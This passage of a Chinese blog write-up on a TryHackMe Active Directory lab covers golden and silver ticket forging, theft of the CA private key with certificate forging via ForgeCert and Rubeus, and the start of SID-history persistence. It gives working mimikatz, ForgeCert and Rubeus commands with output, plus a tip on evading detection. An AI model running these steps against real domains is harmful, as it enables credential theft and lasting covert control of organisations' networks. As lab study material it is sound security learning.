这些用户都是符合的)</p></blockquote><ul><li>由于在域控制器上由KDC服务生成的域设置了Kerberos策略，如果提供票据，则系统信任票据的有效性。这意味着，即使域策略声明Kerberos登录票据（TGT）只有10小时有效，如果票据声明有效期为10 年，那么也会信任票据的有效性期为10年。</li><li>该<a href="http://adsecurity.org/?p=483">KRBTGT</a>帐户密码<a href="http://adsecurity.org/?p=483">从不更改*</a>和直到KRBTGT密码被更改（两次），攻击者可以创建黄金票据。<strong>请注意，即使伪造用户更改其密码，创建用于模拟用户的Golden Ticket仍然存在。</strong></li><li>它绕过了SmartCard身份验证要求，因为它绕过了DC在创建TGT之前执行的常规验证。</li><li>.这个精心创建的TGT要求攻击者拥有Active Directory域的KRBTGT密码哈希值（<a href="http://adsecurity.org/?p=451">通常从域控制器转储</a>）。</li><li>KRBTGT NTLM哈希可用于生成一个有效的TGT（使用RC4）模拟任何用户访问Active Directory中的任何资源。</li><li>在主机上都可以生成和使用黄金票据（TGT），即使没有加入域也是如此。只要网络可以访问域。</li><li>用于从AD森林中的DC获取有效的TGS票据，并提供一个坚持在一切域访问所有的主机的好办法。</li></ul><h4 id="制作条件"><a href="#制作条件" class="headerlink" title="制作条件"></a>制作条件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、域名称            </span><br><span class="line">2、域的SID值</span><br><span class="line">3、域的KRBTGT账户密码HASH</span><br><span class="line">4、伪造用户名，可以是任意的</span><br></pre></td></tr></table></figure><h4 id="制作步骤"><a href="#制作步骤" class="headerlink" title="制作步骤"></a>制作步骤</h4><h5 id="1-导出krbtgt的Hash"><a href="#1-导出krbtgt的Hash" class="headerlink" title="1.导出krbtgt的Hash"></a><strong>1.导出krbtgt的Hash</strong></h5><p>金票的生成需要用到krbtgt的密码HASH值，可以通过mimikatz中的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:za.tryhackme.loc /user:krbtgt@za.tryhackme.loc</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230918093409490.png" alt="image-20230918093409490"></p><h5 id="2-生成Golden-Ticket"><a href="#2-生成Golden-Ticket" class="headerlink" title="2.生成Golden Ticket"></a><strong>2.生成Golden Ticket</strong></h5><p> 得到KRBTGT HASH之后使用mimikatz中的kerberos::golden功能生成金票golden.kiribi，即为伪造成功的TGT。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/admin：伪造的用户名</span><br><span class="line">/domain：域名称</span><br><span class="line">/sid：SID值，注意是去掉最后一个-后面的值</span><br><span class="line">/krbtgt：krbtgt的HASH值</span><br><span class="line">/ticket：生成的票据名称</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:administrator /domain:0day.org /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /ticket:golden.kiribi</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230918093717184.png" alt="image-20230918093717184"></p><h5 id="3-导入伪造Golden-Ticket获得域控权限"><a href="#3-导入伪造Golden-Ticket获得域控权限" class="headerlink" title="3. 导入伪造Golden Ticket获得域控权限"></a><strong>3. 导入伪造Golden Ticket获得域控权限</strong></h5><p>通过mimikatz中的kerberos::ptt功能（Pass The Ticket）将golden.kiribi导入内存中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br><span class="line">kerberos::ptt golden.kiribi</span><br><span class="line">kerberos::list</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230918093932637.png" alt="image-20230918093932637"></p><p>这样成功伪造这台计算机的本地管理员用户了  然后以后这台计算机登录的任何用户都获得这个本地管理员的权限  因为已经注入到内存中了</p><p>此时就可以通过dir成功访问域控的共享文件夹。</p><p><img src="../images/image-20230918094149486.png" alt="image-20230918094149486"></p><h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><ul><li><strong>这种方式导入的Ticket默认在20分钟以内生效，如果过期了，再次ptt导入Golden Ticket即可。</strong></li><li>可以伪造任意用户，即使其不存在。</li><li>krbtgt的NTLM hash不会轻易改变，即使修改域控管理员密码。</li></ul><h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p> Silver Tickets（下面称银票）就是伪造的ST（Service Ticket），因为在TGT已经在PAC里限定了给Client授权的服务（通过SID的值） <strong>就是说计算机已经固定了</strong>，所以银票只能访问指定服务。</p><p>银票是伪造的TGS门票。所以现在，我们跳过了与 DC 上的 K DC 进行的所有通信（上图中的步骤 1-4），只与我们希望直接访问的服务进行接口</p><p>这里的话我在这个 <a href="https://ke1nys.github.io/posts/1bedf17b.html">Kerberos协议中</a> 已经详细的介绍了  和黄金票据一样  先去了解一下</p><p><img src="../images/image-20230918094901060.png" alt="image-20230918094901060"></p><p><strong>白银票据认证流程</strong></p><p><img src="../images/20160118045256924591213.png" alt="Alt text"></p><h4 id="白银票据特点"><a href="#白银票据特点" class="headerlink" title="白银票据特点"></a>白银票据特点</h4><ul><li>.白银票据是一个有效的票据授予服务（TGS）Kerberos票据，因为Kerberos验证服务运行的每台服务器都对服务主体名称的服务帐户进行加密和签名。</li><li>黄金票据是伪造TGT并且有效的获得任何Kerberos服务，而白银票据是伪造TGS。这意味着白银票据仅限于特定服务器上的任何服务。</li><li>大多数服务不验证PAC（通过将PAC校验和发送到域控制器进行PAC验证），因此使用服务帐户密码哈希生成的有效TGS可以完全伪造PAC</li><li>攻击者需要服务帐户密码哈希值</li><li>TGS是伪造的，所以没有和TGT通信，意味着DC从验证过。</li><li>任何事件日志都在目标服务器上。</li></ul><h4 id="制作条件-1"><a href="#制作条件-1" class="headerlink" title="制作条件"></a>制作条件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.域名称</span><br><span class="line">2.域的SID值</span><br><span class="line">3.域中的Server服务器账户的NTLM-Hash</span><br><span class="line">4.伪造的用户名，可以是任意用户名.</span><br><span class="line">5.目标服务器上面的kerberos服务</span><br></pre></td></tr></table></figure><h4 id="白银票据的服务列表"><a href="#白银票据的服务列表" class="headerlink" title="白银票据的服务列表"></a>白银票据的服务列表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">服务名称                    同时需要的服务</span><br><span class="line">WMI                        HOST、RPCSS</span><br><span class="line">PowerShell Remoting        HOST、HTTP</span><br><span class="line">WinRM                    HOST、HTTP</span><br><span class="line">Scheduled Tasks            HOST</span><br><span class="line">Windows File Share        CIFS</span><br><span class="line">LDAP                    LDAP</span><br><span class="line">Windows Remote Server    RPCSS、LDAP、CIFS</span><br></pre></td></tr></table></figure><h4 id="制作步骤-1"><a href="#制作步骤-1" class="headerlink" title="制作步骤"></a>制作步骤</h4><h5 id="1-获取hash-sid等信息"><a href="#1-获取hash-sid等信息" class="headerlink" title="1.获取hash sid等信息"></a>1.获取hash sid等信息</h5><p>首先我们需要知道服务账户的密码HASH  这里我们获取的不是本地计算机的hash值  我们获取的是这台计算机的hash值</p><p><img src="../images/image-20230918100049041.png" alt="image-20230918100049041"></p><h5 id="2-伪造白银票据"><a href="#2-伪造白银票据" class="headerlink" title="2.伪造白银票据"></a>2.伪造白银票据</h5><p>这时得到了THMWRK1$的HASH值，通过mimikatz生成银票。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/domain：当前域名称</span><br><span class="line">/sid：SID值，和金票一样取前面一部分</span><br><span class="line">/target：目标主机，这里是thmwrk1.za.tryhackme.loc</span><br><span class="line">/service：服务名称，这里需要访问共享文件，所以是cifs</span><br><span class="line">/rc4：目标主机的HASH值</span><br><span class="line">/user：伪造的用户名</span><br><span class="line">/ptt：表示的是Pass TheTicket攻击，是把生成的票据导入内存，也可以使用/ticket导出之后再使用kerberos::ptt来导入</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185 /target:thmwrk1.za.tryhackme.loc /service:cifs /rc4:c19d46ece8776ef0c4697daad3b6b13f /user:silver /ptt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230918100440838.png" alt="image-20230918100440838"></p><p>这样的话我们就可以访问这个DC的共享文件夹了</p><p><img src="../images/image-20230918100740794.png" alt="image-20230918100740794"></p><p>这里我们只是伪造了这个<code>cifs</code>(<strong>DC共享文件夹访问权限</strong>)    其实上面还给了好几种访问  我们也是可以进行伪造的</p><h4 id="各种服务中的示例"><a href="#各种服务中的示例" class="headerlink" title="各种服务中的示例"></a>各种服务中的示例</h4><div class="table-container"><table><thead><tr><th>Service Type</th><th>Service Silver Tickets</th></tr></thead><tbody><tr><td>WMI</td><td>HOST RPCSS</td></tr><tr><td>PowerShell Remoting</td><td>HOST HTTP</td></tr><tr><td>WinRM</td><td>HOST HTTP</td></tr><tr><td>Scheduled Tasks</td><td>HOST</td></tr><tr><td>Windows File Share (CIFS)</td><td>CIFS</td></tr><tr><td>LDAP operations includingMimikatz DCSync</td><td>LDAP</td></tr><tr><td>Windows Remote Server Administration Tools</td><td>RPCSS LDAP CIFS</td></tr></tbody></table></div><p>上述服务我们都是可以进行伪造的</p><p>并且就是可以利用这些远程的服务进行远程控制  (这里就不写了  在上面的那篇参考文章里面有 可以自己去查看)</p><h3 id="黄金票据和白银票据的区别"><a href="#黄金票据和白银票据的区别" class="headerlink" title="黄金票据和白银票据的区别"></a>黄金票据和白银票据的区别</h3><h5 id="1-访问权限不同"><a href="#1-访问权限不同" class="headerlink" title="1.访问权限不同"></a>1.访问权限不同</h5><ul><li>Golden Ticket: 伪造TGT,可以获取任何Kerberos服务权限</li><li>Silver Ticket: 伪造TGS,只能访问指定的服务</li></ul><p><strong>2.加密方式不同</strong></p><ul><li>Golden Ticket 由Kerberos的Hash—&gt; krbtgt加密</li><li>Silver Ticket 由服务器端密码的Hash值—&gt; master key 加密</li></ul><h5 id="3-认证流程不同"><a href="#3-认证流程不同" class="headerlink" title="3.认证流程不同"></a>3.认证流程不同</h5><ul><li>Golden Ticket 的利用过程需要访问域控(KDC)</li><li>Silver Ticket 可以直接跳过 KDC 直接访问对应的服务器</li></ul><h2 id="通过证书实现持久性"><a href="#通过证书实现持久性" class="headerlink" title="通过证书实现持久性"></a>通过证书实现持久性</h2><p>这里的话我们之前的一个房间里也讲过这个证书是什么  当时我们是利用这个证书模板来进行权限提审  获取到了这个管理员账户  </p><h3 id="什么是证书"><a href="#什么是证书" class="headerlink" title="什么是证书"></a>什么是证书</h3><p>AD 证书服务 （CS） 是 Microsoft 的公钥基础结构 （PKI） 实现。由于AD在组织中提供了一定程度的信任，因此它可以用作CA来证明和委托信任。AD CS用于多种用途，例如加密文件系统，创建和验证数字签名，甚至<strong>用户身份验证</strong>，使其成为攻击者的有前途的途径。</p><p>由于 AD CS 是一项特权功能，因此它通常在选定的域控制器上运行。这意味着普通用户无法真正直接与服务交互</p><blockquote><p>CA是证书颁发机构</p></blockquote><p>根据我们的访问权限，我们可以更进一步。我们可以简单地<strong>窃取根 CA 证书的私钥</strong>，以便在我们愿意时<strong>生成我们自己的证书</strong>。更糟糕的是，<strong>由于这些证书从未由CA颁发，蓝队无法撤销它们—(因为这是我们自己生成的 )</strong>。这对蓝队来说会更糟，因为这意味着CA的轮换，这意味着蓝队必须撤销所有颁发的证书才能将我们踢出局。想象一下，您刚刚花了两天时间通过轮换每个特权帐户的凭据，重置所有金票和银票来执行域收回，只是为了意识到攻击者通过成为您的CA来坚持。</p><h3 id="提取私钥"><a href="#提取私钥" class="headerlink" title="提取私钥"></a>提取私钥</h3><p>CA 的私钥存储在 CA 服务器本身上。<strong>如果私钥未通过基于硬件的保护方法（如硬件安全模块 （HSM））进行保护</strong>，对于仅将 Active Directory 证书服务 （AD CS） 用于内部目的的组织来说，这种情况通常如此，则它受计算机数据保护 API （DPAPI） 的保护。这意味着我们可以使用Mimikatz和SharpDPAPI等工具来提取CA证书，从而<strong>从CA中提取私钥</strong></p><h4 id="1-我们先来看看是否可以查看存储在-DC-上的证书："><a href="#1-我们先来看看是否可以查看存储在-DC-上的证书：" class="headerlink" title="1.我们先来看看是否可以查看存储在 DC 上的证书："></a>1.我们先来看看是否可以查看存储在 DC 上的证书：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crypto::certificates /systemstore:local_machine</span><br></pre></td></tr></table></figure><blockquote><ul><li>crypto::certificates: 这是mimikatz的一个模块，用于操作证书相关的功能。</li><li>/systemstore:local_machine: 这是指定操作系统存储区的参数，其中”local_machine”表示本地计算机的系统存储区。</li></ul></blockquote><p><img src="../images/image-20230918111444044.png" alt="image-20230918111444044"></p><p><strong>这里解释一下获取的各个参数的含义</strong></p><blockquote><ul><li>System Store：系统存储区的名称，这里是”local_machine”，表示本地计算机的系统存储区。</li><li>Store：证书存储区的名称，这里是”My”，表示个人证书存储区。</li></ul><p>接下来是一个具体的证书信息：</p><ul><li>Subject：证书的主题，即证书所涉及的实体或组织。</li><li>Issuer：证书的颁发者，即签发该证书的实体或组织。</li><li>Serial：证书的序列号，用于唯一标识证书。</li><li>Algorithm：证书使用的加密算法。</li><li>Validity：证书的有效期，包括起始时间和结束时间。</li><li>Hash SHA1：证书的SHA1哈希值，用于唯一标识证书。</li><li>Key Container：证书的密钥容器，用于存储与该证书关联的密钥。</li><li>Provider：证书的加密提供程序，这里是”Microsoft RSA SChannel Cryptographic Provider”。</li><li>Provider type：提供程序的类型，这里是RSA_SCHANNEL (12)。</li><li>Type：密钥类型，这里是AT_KEYEXCHANGE，表示该证书用于密钥交换。</li><li>Provider name：提供程序的名称。</li><li>Key Container：密钥容器的名称。</li><li>Unique name：密钥容器的唯一名称。</li><li>Implementation：加密实现的类型。</li><li>Algorithm：加密算法的类型。</li><li>Key size：密钥的长度。</li><li>Key permissions：密钥的权限。</li><li>Exportable key：密钥是否可导出。</li></ul></blockquote><p>我们可以看到 DC 上有一个 CA 证书。我们还可以注意到，<strong>其中一些证书设置为不允许我们导出密钥(因为就是Exportable key  为No  所以就不能导出)</strong>。如果没有此私钥，我们将无法生成新证书。幸运的是，Mimikatz 允许我们修补内存以使这些键可导出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">Privilege &#x27;20&#x27; OK</span><br><span class="line"></span><br><span class="line">mimikatz # crypto::capi</span><br><span class="line">Local CryptoAPI RSA CSP patched</span><br><span class="line">Local CryptoAPI DSS CSP patched</span><br><span class="line"></span><br><span class="line">mimikatz # crypto::cng</span><br><span class="line">&quot;KeyIso&quot; service patched</span><br><span class="line"></span><br><span class="line">//使用上面的指令修补内存后 我们就可以导出证书了</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crypto::certificates /systemstore:local_machine /export</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230918111933318.png" alt="image-20230918111933318"></p><p>绕过上面的这个<code>Exportable key</code>限制   <strong>成功的导出了证书和私钥</strong></p><p>导出的证书将以 PFX 和 DER 格式存储到磁盘：</p><blockquote><p>‘local<em>machine_My_0</em>.pfx’文件应该包含了私钥和相应的证书，可以用于在其他环境中导入和使用该私钥。</p><p>‘local<em>machine_My_0</em>.der’文件应该包含了一个公钥的导出结果。公钥是在加密和数字签名等过程中使用的关键信息，它可以被其他人使用来验证数字签名或加密数据。导出的公钥文件可以在其他环境中导入并用于进行加密和验证操作。</p></blockquote><p><img src="../images/image-20230918113528331.png" alt="image-20230918113528331"></p><p>这样子的话我们就能获取到所有证书了</p><p>证书 <code>za-THMDC-CA.pfx</code> 是我们特别感兴趣的证书。为了导出私钥，必须使用密码来加密证书。默认情况下，Mimikatz 分配的密码为 <code>mimikatz</code> </p><h3 id="生成我们自己的证书"><a href="#生成我们自己的证书" class="headerlink" title="生成我们自己的证书"></a>生成我们自己的证书</h3><p>现在我们有了私钥和根CA证书，我们可以使用SpectorOps ForgeCert工具为我们想要的任何用户伪造客户端身份验证证书。<code>ForgeCert</code>和<code>Rubeus</code>二进制文件是我们生成证书要用到的工具</p><p><strong>这里我们在获取到这个管理员证书后  我们可以将这个证书复制到别的低权限用户出 任何来给该用户伪造证书</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123</span><br></pre></td></tr></table></figure><ul><li><strong>CaCertPath - 导出的 CA 证书的路径。</strong></li><li>CaCertPassword - 用于加密证书的密码。默认情况下，Mimikatz 分配的密码 <code>mimikatz</code> 为 。</li><li><strong>Subject</strong> - 证书的使用者或公用名。这在我们将使用证书的上下文中并不重要。</li><li><strong>SubjectAltName</strong>-这是我们要使用此证书模拟的帐户的用户主体名称 （UPN）。它必须是合法用户。</li><li>NewCertPath - ForgeCert 将存储生成的证书的路径。</li><li>NewCertPassword - 由于证书需要导出私钥进行身份验证，因此我们必须设置用于加密它的新密码。</li></ul><h3 id="验证证书是否伪造成功"><a href="#验证证书是否伪造成功" class="headerlink" title="验证证书是否伪造成功"></a>验证证书是否伪造成功</h3><p>我们可以使用 Rubeus 使用证书请求 TGT，以验证证书是否受信任。我们将使用以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:fullAdmin.pfx /password:Password123 /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.x.101</span><br></pre></td></tr></table></figure><p>这里的<code>password</code>是上面生成证书用到的<code>NewCertPassword</code>  </p><ul><li>/user - 这指定我们将模拟的用户，并且必须与我们生成的证书的 UPN 匹配</li><li>/enctype - 指定票证的加密类型。设置此项对于规避很重要，因为默认加密算法很弱，这会导致哈希超交警报</li><li>/certificate - 我们生成的证书的路径</li><li>/password - 证书文件的密码</li><li>/outfile - 我们的 TGT 将输出到的文件</li><li>/domain - 我们当前攻击的域的 FQDN</li><li>/dc - 我们从中请求 TGT 的域控制器的 IP。通常，最好选择运行 CA 服务的 DC</li></ul><p>执行命令后，我们应该收到我们的 TGT：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.x.101</span><br><span class="line">          ______        _</span><br><span class="line">         (_____ \      | |</span><br><span class="line">          _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">         |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">         | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">         |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line">       </span><br><span class="line">         v2.0.0</span><br><span class="line">       </span><br><span class="line">       [*] Action: Ask TGT</span><br><span class="line">       </span><br><span class="line">       [*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=vulncert</span><br><span class="line">       [*] Building AS-REQ (w/ PKINIT preauth) for: &#x27;za.tryhackme.loc\Administrator&#x27;</span><br><span class="line">       [+] TGT request successful!</span><br><span class="line">       [*] base64(ticket.kirbi):</span><br><span class="line">       </span><br><span class="line">             doIGADCCBfygAwIBBaEDAgEWooIE+jCCBPZhggTyMIIE7qADAgEFoREbD0xVTkFSLkVSVUNBLkNPTaIk</span><br><span class="line">             MCKgAwIBAqEbMBkbBmtyYnRndBsPbHVuYXIuZXJ1Y2EuY29to4IErDCCBKigAwIBEqEDAgECooIEmgSC</span><br><span class="line">             BJaqEcIY2IcGQKFNgPbDVY0ZXsEdeJAmAL2ARoESt1XvdKC5Y94GECr+FoxztaW2DVmTpou8g116F6mZ</span><br><span class="line">             nSHYrZXEJc5Z84qMGEzEpa38zLGEdSyqIFL9/avtTHqBeqpR4kzY2B/ekqhkUvdb5jqapIK4MkKMd4D/</span><br><span class="line">             MHLr5jqTv6Ze2nwTMAcImRpxE5HSxFKO7efZcz2glEk2mQptLtUq+kdFEhDozHMAuF/wAvCXiQEO8NkD</span><br><span class="line">             zeyabnPAtE3Vca6vfmzVTJnLUKMIuYOi+7DgDHgBVbuXqorphZNl4L6o5NmviXNMYazDybaxKRvzwrSr</span><br><span class="line">             2Ud1MYmJcIsL3DMBa4bxR57Eb5FhOVD29xM+X+lswtWhUO9mUrVyEuHtfV7DUxA94OvX1QmCcas4LXQW</span><br><span class="line">             ggOit/DCJdeyE8JjikZcR1yL4u7g+vwD+SLkusCZE08XDj6lopupt2Hl8j2QLR2ImOJjq54scOllW4lM</span><br><span class="line">             Qek4yqKwP6p0oo4ICxusM8cPwPUxVcYdTCh+BczRTbpoKiFnI+0qOZDtgaJZ/neRdRktYhTsGL39VHB5</span><br><span class="line">             i+kOk3CkcstLfdAP1ck4O+NywDMUK+PhGJM/7ykFe2zICIMaGYGnUDRrad3z8dpQWGPyTBgTvemwS3wW</span><br><span class="line">             NuPbQFFaoyiDiJyXPh+VqivhTUX9st80ZJZWzpE7P1pTNPGq38/6NyLjiE9srbOt6hCLzUaOSMGH1Enf</span><br><span class="line">             SYmNljeW2R0gsFWBaFt16AHfT9G9Et2nOCJn/D/OFePFyR4uJF44p82CmVlBhzOxnCaGtQM2v9lwBqQF</span><br><span class="line">             CcVLjxGXqKrPUr1RUGthP861jhMoXD4jBJ/Q32CkgVdlJRMweqcIfNqP/4mEjbUN5qjNqejYdUb/b5xw</span><br><span class="line">             S794AkaKHcLFvukd41VTm87VvDOp6mM5lID/PLtTCPUZ0zrEb01SNiCdB5IAfnV23vmqsOocis4uZklG</span><br><span class="line">             CNdI1/lsICpS/jaK6NM/0oKehMg+h4VAFLx4HnTSY4ugbrkdxU948qxPEfok/P6umEuny7yTDQFoCUKk</span><br><span class="line">             RuLXbtwwplYTGBDLfzwhcNX8kc/GGLbH9+B8zRXxhd3TGQ7ZT03r798AjobKx024ozt6g4gjS5k/yIT+</span><br><span class="line">             f29XrPzc+UODunO2Qv8JM5NAE3L6ryHp/DdgTaXGBRccgQBeQERNz6wxkdVK6SB7juOjU5JoZ5ZfmTuO</span><br><span class="line">             hQ5hnboH1GvMy4+zeU2P7foWEJE76i9uZMbjUilbWRERYUL/ZjjXQBVWBaxoAdFIoawAzSXUZniNavnS</span><br><span class="line">             n22qqgbd79Zj+lRavAb7Wlk5Gul4G6LMkh2MIJ4JOnrV0JV1yOhoqZ5V6KX/2r7ecyrVZIf2Qf0+ci9G</span><br><span class="line">             vboJiLvWKgXkx7VaKbcLhO743BNYyq57nPNvWhVt3jbFmEq4nTdNou6hQHG4O5hVMhBKGgTwYz3yFPOP</span><br><span class="line">             iuxroniQawSUJbmwObxVeoculPhxEJ69MSgKROTXrKrQAJ84D5QJHQYZus6w+LtodZn1//ZLhgILeFsY</span><br><span class="line">             5K6d4ot2eqEr/A4Vu+wFjGjw87FTvHVcf8HdtGhqkawtPOrzo4HxMIHuoAMCAQCigeYEgeN9geAwgd2g</span><br><span class="line">             gdowgdcwgdSgKzApoAMCARKhIgQgQr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVWhERsPTFVO</span><br><span class="line">             QVIuRVJVQ0EuQ09NohcwFaADAgEBoQ4wDBsKc3ZjLmdpdGxhYqMHAwUAQOEAAKURGA8yMDIyMDIwNjE3</span><br><span class="line">             NTQ0NlqmERgPMjAyMjAyMDcwMzU0NDZapxEYDzIwMjIwMjEzMTc1NDQ2WqgRGw9MVU5BUi5FUlVDQS5D</span><br><span class="line">             T02pJDAioAMCAQKhGzAZGwZrcmJ0Z3QbD2x1bmFyLmVydWNhLmNvbQ=</span><br><span class="line">       </span><br><span class="line">         ServiceName              :  krbtgt/za.tryhackme.loc</span><br><span class="line">         ServiceRealm             :  za.tryhackme.loc</span><br><span class="line">         UserName                 :  Administrator</span><br><span class="line">         UserRealm                :  za.tryhackme.loc</span><br><span class="line">         StartTime                :  2/6/2022 5:54:46 PM</span><br><span class="line">         EndTime                  :  2/7/2022 3:54:46 AM</span><br><span class="line">         RenewTill                :  2/13/2022 5:54:46 PM</span><br><span class="line">         Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable</span><br><span class="line">         KeyType                  :  aes256_cts_hmac_sha1</span><br><span class="line">         Base64(key)              :  Qr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVU=</span><br><span class="line">         ASREP (key)              :  BF2483247FA4CB89DA0417DFEC7FC57C79170BAB55497E0C45F19D976FD617ED</span><br></pre></td></tr></table></figure><h3 id="验证TGT是否有效"><a href="#验证TGT是否有效" class="headerlink" title="验证TGT是否有效"></a>验证TGT是否有效</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::ptt administrator.kirbi</span><br></pre></td></tr></table></figure><p>然后访问域控共享文件夹</p><p>能访问成功就是有效</p><p><strong>这样的话本地管理员账户就伪造成功了</strong>  这样的话普通用户也具有了管理员的权限 并且这样的话就是即使修改管理员密码也不影响我们证书的使用</p><p>并且就是我们是自己导出私钥来自己生成的证书  那么在AD -CS中是找不到我们的证书的  所以是删除不掉的</p><p>那么想要删除的话就必须删除整个CA来使全部的CS失效才行  这样的话蓝队的工作量就会非常大了  这样子的话还会影响整个域的运行  可能会导致重建系统</p><p><strong>这个就是无需获取hash密码的权限维持</strong></p><h2 id="通过-SID-历史记录保持"><a href="#通过-SID-历史记录保持" class="headerlink" title="通过 SID 历史记录保持"></a>通过 SID 历史记录保持</h2><p>这个的话我在打春秋云镜的Time靶机的时候遇到过   <a href="https://www.cnblogs.com/f-carey/p/15705635.html">参考文章</a></p><h3 id="SID作用"><a href="#SID作用" class="headerlink" title="SID作用"></a>SID作用</h3><p><strong>SID 用于在连接到资源时跟踪安全主体和帐户的访问权限。但是，帐户上有一个有趣的属性，称为 SID 历史记录  SID History是在域迁移过程中需要使用的一个属性。</strong></p><blockquote><p> 如果A域中的域用户迁移到B域中，那么该用户的SID值就会改变，进而其权限也会改变。导致迁移后的用户无法访问以前可以访问的资源。<strong>SID History的作用是在域迁移过程中保持域用户的访问权限，如果迁移后用户的SID值改变，系统会将原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源—————（这句话就关键了  如果我们拿下域控后  将域控管理员的SID赋值给任意一个低权限用户的话  那么该低权限用户就拥有和域控管理员一样的权限了）</strong>。使用mimikatz可以将SID History属性添加到任意用户的SID History属性中。在渗透测试中，如果获得了域管理员权限（或者等同于域管理员权限），就可以将SID History作为实现持久化的方法。</p></blockquote><h3 id="SID-History利用"><a href="#SID-History利用" class="headerlink" title="SID-History利用"></a>SID-History利用</h3><ol><li>先去查看低权限用户的SID-History是否为空</li></ol><p><img src="../images/image-20230925102408995.png" alt="image-20230925102408995"></p><p>这确认我们的用户当前未设置任何 SID 历史记录。让我们获取域管理员组的 